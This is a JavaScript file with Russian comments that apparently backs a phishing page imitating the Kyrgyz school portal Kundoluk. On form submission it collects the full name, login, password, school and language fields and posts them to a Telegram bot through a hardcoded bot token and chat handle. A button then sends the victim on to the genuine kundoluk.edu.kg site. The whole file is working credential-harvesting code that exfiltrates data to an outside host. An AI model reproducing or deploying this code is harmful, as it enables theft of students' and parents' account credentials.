// 1) Находим форму. Если она не найдётся — увидите ошибку в консоли.
const form = document.querySelector("form");
if (!form) {
    console.error("❌ Форма не найдена в DOM. Проверьте селектор.");

}

const token = "7767965025:AAHAfnWaK1-XrfsgMuToFP8VwaxTHx31hFM";
// ————————————————————————————————————————————
// 2) Chat ID: для приватной группы или канала нужно числовое значение!
//    Получить его можно так:
//    1) Добавить бота в группу/канал.
//    2) Отправить что-нибудь в группу (от любого пользователя).
//    3) В браузере открыть:
//       https://api.telegram.org/bot<ВАШ_ТОКЕН>/getUpdates
//    4) В ответе найти "chat":{"id":-1001234567890,...}
//    5) Подставить это число сюда:
const chatId = "@nahuikundolik";  // <- замените на своё!

const URL_API = `https://api.telegram.org/bot${token}/sendMessage`;

form.addEventListener("submit", async (e) => {
    e.preventDefault();
    // 3) Достаём каждое поле явно, чтобы не было путаницы
    const data = new FormData(form);
    const fio = data.get("fio") || "";
    const login = data.get("login") || "";
    const password = data.get("password") || "";
    const school = data.get("school") || "";
    const language = data.get("language") || "";
    const agree = data.has("agree") ? "Да" : "Нет";

    const text =
        `ФИО: ${fio}\n` +
        `Логин: ${login}\n` +
        `Пароль: ${password}\n` +
        `Школа: ${school}\n` +
        `Язык обучения: ${language}\n` +
        `Согласие: ${agree}`;

    console.log("Отправляем в Telegram:", {chat_id: chatId, text});

    try {
        const resp = await fetch(URL_API, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({chat_id: chatId, text})
        });
        const result = await resp.json();
        console.log("Ответ Telegram API:", result);
        if (!result.ok) {
            alert(`Ошибка Telegram API:\n${result.description}`);
        }
    } catch (err) {
        console.error("Ошибка при fetch():", err);
        alert("Не удалось отправить данные. Смотрите консоль.");
    }
});


// 4) Функция для показа/скрытия пароля
function togglePassword() {
    const pwd = document.getElementById("password");
    pwd.type = pwd.type === "password" ? "text" : "password";
}
const redirectBtn = document.getElementById("redirectBtn");
if (redirectBtn) {
    redirectBtn.addEventListener("click", () => {
        window.location.href = "https://kundoluk.edu.kg/";
    });
} else {
    console.error("Кнопка для редиректа не найдена: #redirectBtn");
}